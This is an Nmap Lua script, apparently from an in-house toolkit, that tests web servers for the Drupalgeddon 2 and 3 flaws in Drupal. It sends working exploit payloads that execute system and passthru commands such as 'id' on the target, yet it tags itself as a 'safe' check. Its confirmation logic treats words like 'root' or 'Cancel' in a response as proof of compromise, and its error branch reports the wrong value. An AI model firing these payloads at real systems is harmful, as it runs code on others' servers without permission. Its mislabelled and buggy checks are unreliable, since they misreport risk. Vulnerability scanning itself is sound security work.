local http = require "http"
local stdnse = require "stdnse"

description = [[Detects Drupalgeddon 2 (CVE-2018-7600) and Drupalgeddon 3 (CVE-2018-7602) remote code execution.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"vuln", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and port.service == "http" end

action = function(host, port)
  local ok, result = pcall(function()
    local findings = {}
    local server_banner = ""

    local banner_req = http.get(host, port, "/")
    if banner_req and banner_req.headers and banner_req.headers["server"] then
      local sv = banner_req.headers["server"]
      server_banner = type(sv) == "table" and sv[1] or sv
    end

    local is_drupal = false
    local drupal_version = nil
    if banner_req and banner_req.body then
      local body = banner_req.body
      if body:match("Drupal") or body:match("drupal") or body:match("Sites") then
        is_drupal = true
        drupal_version = body:match("Drupal%s+([%d%.]+)") or body:match("drupal%-settings") and "unknown"
      end
    end

    local drupalgeddon2_payloads = {
      {
        path = "/user/register?element_parents=account/mail/%23value&ajax_form=1",
        data = "form_id=user_register_form&_drupal_ajax=1&mail[a][#lazy_builder][]=printf&mail[a][#lazy_builder][][]=HackIT_RCE_Test",
        label = "CVE-2018-7600 via user/register",
      },
      {
        path = "/user/register?element_parents=account/mail/%23value&ajax_form=1",
        data = "form_id=user_register_form&_drupal_ajax=1&mail[a][#lazy_builder][]=system&mail[a][#lazy_builder][][]=id",
        label = "CVE-2018-7600 via user/register (system)",
      },
      {
        path = "/user/register?element_parents=account/mail/%23value&ajax_form=1",
        data = "form_id=user_register_form&_drupal_ajax=1&mail[a][#lazy_builder][]=passthru&mail[a][#lazy_builder][][]=id",
        label = "CVE-2018-7600 via passthru",
      },
    }

    for _, payload in ipairs(drupalgeddon2_payloads) do
      local req = http.post(host, port, payload.path, {
        header = {["Content-Type"] = "application/x-www-form-urlencoded"},
        data = payload.data
      })
      if req and req.body then
        local body = req.body
        if body:match("HackIT_RCE_Test") or body:match("uid=") or body:match("www%-data") or body:match("nobody") or body:match("root") then
          local excerpt = body:sub(1, 100):gsub("\n", " "):gsub("\r", "")
          table.insert(findings, {label = payload.label, excerpt = excerpt, status = req.status, severity = "CRITICAL"})
        end
        if body:match("built") and body:match("lazy") and body:match("render") then
          table.insert(findings, {label = payload.label .. " (lazy builder triggered)", excerpt = body:sub(1, 80), status = req.status, severity = "CRITICAL"})
        end
      end
    end

    local drupalgeddon3_payload = {
      path = "/?q=user/1/cancel&_format=json",
      data = '{"mail":["test@test.com",{"#lazy_builder":["printf",["HackIT_%s_Test"]]}],"form_token":["invalid"],"form_id":"user_cancel_form","_drupal_ajax":true,"current_pass":["test"]}',
    }

    local req3 = http.post(host, port, drupalgeddon3_payload.path, {
      header = {["Content-Type"] = "application/json"},
      data = drupalgeddon3_payload.data:format("RCE3")
    })
    if req3 and req3.body and (req3.body:match("HackIT_RCE3_Test") or req3.body:match("Cancel")) then
      table.insert(findings, {label = "CVE-2018-7602 via JSON API", excerpt = req3.body:sub(1, 80), status = req3.status, severity = "CRITICAL"})
    end

    if not is_drupal then
      local drupal_paths = {"/user/register", "/user/login", "/node/1", "/CHANGELOG.txt", "/core/CHANGELOG.txt"}
      for _, p in ipairs(drupal_paths) do
        local req = http.get(host, port, p)
        if req and req.status == 200 then
          local body = req.body or ""
          if body:match("Drupal") or body:match("drupal") or body:match("user%-login") or body:match("Sites") then
            is_drupal = true
            drupal_version = body:match("Drupal%s+([%d%.]+)") or drupal_version
            break
          end
        end
      end
    end

    if #findings > 0 then
      local result = stdnse.output_table()
      result.cve = "CVE-2018-7600, CVE-2018-7602"
      result.severity = "CRITICAL"
      result.vulnerable = true
      result.server = server_banner
      result.version = drupal_version or "unknown"
      result.detail = ("Drupalgeddon RCE confirmed via %d vector(s)"):format(#findings)
      for i, f in ipairs(findings) do
        result[("vector_%d"):format(i)] = ("%s (HTTP %d): %s"):format(f.label, f.status, f.excerpt)
      end
      if drupal_version then
        local parts = {}
        for v in drupal_version:gmatch("%d+") do table.insert(parts, tonumber(v)) end
        if #parts >= 2 then
          local num = parts[1] * 100 + parts[2]
          if (num >= 700 and num < 759) or (num >= 800 and num < 806) then
            result.version_note = ("Drupal %s is within vulnerable range"):format(drupal_version)
          end
        end
      end
      return result
    end

    local result = stdnse.output_table()
    result.cve = "CVE-2018-7600, CVE-2018-7602"
    result.severity = is_drupal and "MEDIUM" or "LOW"
    result.vulnerable = false
    result.server = server_banner
    result.version = drupal_version or "unknown"
    result.detail = is_drupal and "Drupal detected but RCE not confirmed via tested vectors" or "No Drupal detected"
    return result
  end)
  if not ok then
    local result = stdnse.output_table()
    result.cve = "CVE-2018-7600"
    result.severity = "MEDIUM"
    result.vulnerable = false
    result.detail = "Error during scan: " .. tostring(result)
    result.error = true
    return result
  end
  return result
end
